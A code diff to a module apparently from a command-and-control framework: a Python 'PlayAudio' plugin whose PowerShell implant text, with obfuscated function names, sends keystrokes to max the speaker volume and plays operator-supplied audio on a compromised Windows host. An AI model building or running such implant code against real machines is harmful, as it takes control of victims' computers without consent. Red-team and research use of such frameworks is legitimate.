@@ -1,38 +1,38 @@
+
+import os
 class PlayAudio:
     type = "PS"
     args = "Local sound file location"
     input = "play_audio"
 
     def process_implant_response(self, data, args):
-        return f"Audio success:\n{args}", None
+        print(data)
+        if data.decode()=="1":
+            return f"Audio success: {args}", None
+        else:
+            return f"Audio play failed.", None
 
     def implant_text(self):
         var = '''
 function {{ ron.obf_remote_play_audio }}($data){
     if ($data.length -lt 4){
-            $global:tr = "1"
+            $global:tr = 0
         }
-    $file = "dev_temp_name"
-    $t = "$env:TMP/$file.mp3"
-    $data | Set-Content "$t" -encoding Byte -NoNewLine
-
-    Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50  | % {$wshShell.SendKeys([char]175)}}
-    Set-Speaker -Volume 50
-
-    Add-Type -AssemblyName presentationCore
-    $mediaPlayer = New-Object system.windows.media.mediaplayer
-    $mediaPlayer.Volume = 1
-    $mediaPlayer.Open("$t")
-    $duration = 2
-    $duration = $duration + $mediaPlayer.NaturalDuration.TimeSpan.TotalSeconds
-    $mediaPlayer.Play()
-    sleep($duration)
-    $mediaPlayer.Close()
-    Remove-Item -Confirm:$false "$t"
-    $global:tr = "Audio success."
-    return
+    $wshShell = new-object -com wscript.shell;1..50  | % {$wshShell.SendKeys([char]175)}
+    $fs = [System.IO.MemoryStream]::new($data)
+    $PlayWav = [System.Media.SoundPlayer]::new($fs)
+    $PlayWav.play()
+    $PlayWav.Dispose()
+    $global:tr = 1
 }
-
-
 '''
         return var
+
+    def pre_process_command(self, argument_string):
+        # Check if the argument to be passed to the implant is valid.
+        # I.e.
+        #    Does the file to be uploaded exist local?
+        #    Is the command to be executed dangerous?
+        path = f"{os.getcwd()}/Storage/implant_resources/{argument_string}"
+        return os.path.exists(path)
+        # return True
